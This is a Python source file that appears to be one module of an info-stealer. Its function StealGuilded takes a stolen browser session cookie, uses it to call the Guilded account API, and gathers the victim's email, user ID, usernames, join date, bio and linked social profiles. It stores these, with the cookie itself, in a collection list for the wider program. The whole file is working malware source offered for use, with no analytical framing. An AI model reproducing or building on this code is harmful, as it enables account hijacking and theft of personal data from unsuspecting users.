import aiohttp # type: ignore
from main import ListFonction, error_handler


async def StealGuilded(self, cookie, browser: str) -> None:
    try:
        urlguild = "https://www.guilded.gg/api/me"
        headersguild = {
            "Cookie": f"hmac_signed_session={cookie}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        }

        async with aiohttp.ClientSession(headers=headersguild, connector=aiohttp.TCPConnector(ssl=True)) as session:
            async with session.get(urlguild) as response:
                data = await response.json()

        social_links_info = [{"Name": link.get('handle', ''), "Website": link.get('type', 'Cannot get the website'), "URL": link.get('additionalInfo', {}).get('profileUrl', 'No Website')} for link in data["user"].get('socialLinks', [])] or 'No Connections'

        formatted_social_links = "\n".join([f"📙 {link['Name']}\n🌐 {link['Website']}\n`🔗 {link['URL']}`" for link in social_links_info]) if social_links_info != 'No Connections' else 'No Connections'

        email = data["user"].get("email", 'No Email')
        ids = data["user"].get("id", 'Error getting ID')
        globalusername = data["user"].get("name", 'No global username')
        username = data["user"].get("subdomain", 'No Subdomain (Private Username)')
        join = data["user"].get("joinDate", "Couldn't get join date")
        bio = data["user"]["aboutInfo"].get("tagLine", "Couldn't get user bio")

    except Exception as e:
        error_handler(f"guilded session error - {str(e)}")
    else:
        ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}")
